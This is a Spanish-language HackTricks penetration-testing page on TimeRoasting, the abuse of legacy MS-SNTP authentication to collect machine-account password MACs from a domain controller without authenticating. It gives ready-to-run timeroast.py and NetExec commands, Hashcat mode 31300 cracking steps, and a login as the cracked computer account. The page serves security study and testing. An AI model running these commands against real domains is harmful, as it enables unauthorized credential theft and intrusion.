# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting abusa de la autenticación heredada de MS-SNTP. Un cliente no autenticado puede enviar una solicitud de 68 bytes que contiene un RID de cuenta de equipo elegido. Para la ruta heredada vulnerable, el controlador de dominio deriva el autenticador de respuesta mediante Netlogon usando el hash NT de la cuenta de equipo (el secreto de contraseña derivado de MD4), lo que proporciona al atacante un par challenge/MAC adecuado para realizar ataques de adivinación de contraseñas offline (modo 31300 de Hashcat).<sup>[[1]](#references)[[2]](#references)</sup>

Las secciones 3.1.5.1 y 4 de MS-SNTP describen el comportamiento de la solicitud y la respuesta:<sup>[[1]](#references)</sup>
![TimeRoasting: consulta las secciones 3.1.5.1 "Authentication Request Behavior" y 4 "Protocol Examples" de la especificación oficial de MS-SNTP para obtener más detalles](../../images/Pasted%20image%2020250709114508.png)
Cuando `ExtendedAuthenticatorSupported` es false, la solicitud almacena el RID en los 31 bits inferiores del Key Identifier del autenticador y un bit selector en el bit superior. El servidor verifica la longitud de 68 bytes, extrae el RID, solicita a Netlogon que calcule las sumas de comprobación candidatas, selecciona una mediante ese bit superior, pone a cero el Key Identifier de respuesta y devuelve la suma de comprobación seleccionada.<sup>[[1]](#references)</sup>

La suma de comprobación criptográfica se basa en MD5 (consulta 3.2.5.1.1) y puede crackearse offline, lo que permite el ataque de roasting.<sup>[[1]](#references)</sup>

## Cómo atacar

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Scripts de Timeroasting de Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Ataque práctico (sin autenticación) con NetExec + Hashcat

- El módulo `timeroast` de NetExec puede enumerar los RIDs de los equipos, recopilar MACs de MS-SNTP sin autenticación e imprimir hashes `$sntp-ms$` listos para crackear:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline con Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- El texto plano recuperado corresponde a la contraseña de una cuenta de equipo. Inténtalo directamente como la cuenta de equipo usando Kerberos (-k) cuando NTLM esté deshabilitado:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Notas operativas
- Asegúrate de que la hora sea precisa antes de usar las credenciales recuperadas con Kerberos. Prefiere un cliente NTP mantenido, como `chronyd`/`systemd-timesyncd`; `ntpdate` se conserva aquí como un comando común de laboratorio: `sudo ntpdate <dc_fqdn>`.
- Si es necesario, genera krb5.conf para el realm de AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Asigna los RIDs a principals posteriormente mediante LDAP/BloodHound cuando tengas cualquier foothold autenticado.

## References

- [1] [MS-SNTP: Protocolo simple de hora de red de Microsoft](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – whitepaper de Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — código fuente del módulo `timeroast`](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Modo 31300 de Hashcat – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
